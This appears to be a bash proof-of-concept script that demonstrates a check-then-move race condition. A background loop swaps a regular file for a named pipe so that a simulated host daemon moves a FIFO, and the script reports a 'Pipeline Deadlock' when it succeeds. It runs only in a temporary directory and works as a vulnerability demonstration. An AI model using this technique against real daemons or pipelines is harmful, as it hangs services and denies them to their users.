#!/bin/bash
mkdir -p /tmp/workspace_test
touch /tmp/workspace_test/artifact.json

# Background attacker
(
  while true; do
    rm -f /tmp/workspace_test/artifact.json
    mkfifo /tmp/workspace_test/artifact.json
    rm -f /tmp/workspace_test/artifact.json
    touch /tmp/workspace_test/artifact.json
  done
) &
ATTACKER_PID=$!

# Host daemon simulation
for i in {1..1000}; do
  if [ -f "/tmp/workspace_test/artifact.json" ] && [ ! -L "/tmp/workspace_test/artifact.json" ]; then
    size=$(stat -c%s "/tmp/workspace_test/artifact.json" 2>/dev/null || echo "0")
    if [ "$size" -lt 10485760 ]; then
      mv -T "/tmp/workspace_test/artifact.json" "/tmp/workspace_test/final_state.json" 2>/dev/null
      if [ -p "/tmp/workspace_test/final_state.json" ]; then
        echo "SUCCESS: Moved a FIFO! Pipeline Deadlock Achieved at attempt $i"
        kill $ATTACKER_PID
        rm -rf /tmp/workspace_test
        exit 0
      fi
    fi
  fi
done

kill $ATTACKER_PID
rm -rf /tmp/workspace_test
echo "FAILED to trigger race condition."
